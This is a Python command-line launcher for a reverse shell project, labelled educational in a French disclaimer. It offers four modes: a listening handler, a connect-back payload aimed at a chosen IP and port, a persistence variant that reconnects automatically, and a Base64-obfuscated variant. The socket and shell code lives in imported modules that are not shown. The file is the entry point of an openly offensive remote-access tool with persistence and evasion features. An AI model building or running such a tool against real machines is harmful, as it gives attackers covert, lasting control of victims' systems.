#!/usr/bin/env python3
"""
Reverse Shell - Main Launcher
Simple entry point for the refactored reverse shell project

AVERTISSEMENT SÉCURITÉ:
Ce code est destiné à l'apprentissage uniquement.
Usage sur systèmes non autorisés = CRIMINEL.
"""

import sys
import argparse
from src.handler import ReverseShellHandler
from src.payload import ReverseShellPayload
from src.persistence import ReverseShellAvecPersistance
from src.obfuscation import ReverseShellObfusquee
from src.utils import print_banner, validate_ip, validate_port
from config.settings import DEFAULT_PORT


def main():
    """Point d'entrée principal"""
    
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="Reverse Shell - Educational Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        'mode',
        choices=['handler', 'payload', 'persistence', 'obfuscation'],
        help='Mode d\'exécution'
    )
    
    parser.add_argument(
        '--ip',
        default='localhost',
        help='IP address (for payload modes)'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=DEFAULT_PORT,
        help=f'Port number (default: {DEFAULT_PORT})'
    )
    
    args = parser.parse_args()
    
    # Validate inputs
    if args.mode != 'handler' and not validate_ip(args.ip):
        print(f"[ERREUR] IP invalide: {args.ip}")
        sys.exit(1)
    
    if not validate_port(args.port):
        print(f"[ERREUR] Port invalide: {args.port}")
        sys.exit(1)
    
    # Execute based on mode
    try:
        if args.mode == 'handler':
            print(f"\n[MODE] Handler - Listening on port {args.port}")
            handler = ReverseShellHandler(port=args.port)
            if handler.demarrer():
                handler.boucle_interactive()
        
        elif args.mode == 'payload':
            print(f"\n[MODE] Payload - Connecting to {args.ip}:{args.port}")
            payload = ReverseShellPayload(args.ip, args.port)
            if payload.connecter():
                payload.boucle_reception()
        
        elif args.mode == 'persistence':
            print(f"\n[MODE] Persistence - With auto-reconnect")
            payload = ReverseShellAvecPersistance(args.ip, args.port)
            payload.boucle_reception()
        
        elif args.mode == 'obfuscation':
            print(f"\n[MODE] Obfuscation - With Base64 encoding")
            payload = ReverseShellObfusquee(args.ip, args.port)
            if payload.connecter():
                payload.boucle_reception()
    
    except KeyboardInterrupt:
        print("\n[INFO] Interrupted by user")
    except Exception as e:
        print(f"\n[ERREUR] {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
